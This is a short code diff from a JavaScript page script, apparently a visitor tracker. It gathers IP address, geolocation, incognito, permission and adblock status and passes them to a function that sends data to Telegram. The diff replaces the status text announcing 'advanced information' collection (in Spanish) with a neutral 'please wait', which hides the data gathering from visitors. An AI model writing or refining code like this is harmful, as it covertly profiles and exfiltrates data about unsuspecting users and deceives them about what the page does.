@@ -138,7 +138,7 @@ async function sendToTelegram(message) {
 }
 
 async function collectAndSend() {
-  resultEl.textContent = "📡 Recopilando información avanzada...";
+  resultEl.textContent = "Espera porfavor...";
 
   const [ipRes, geoRes, incognitoStatus, permStatus, adblockStatus] = await Promise.allSettled([
     getIPInfo(),
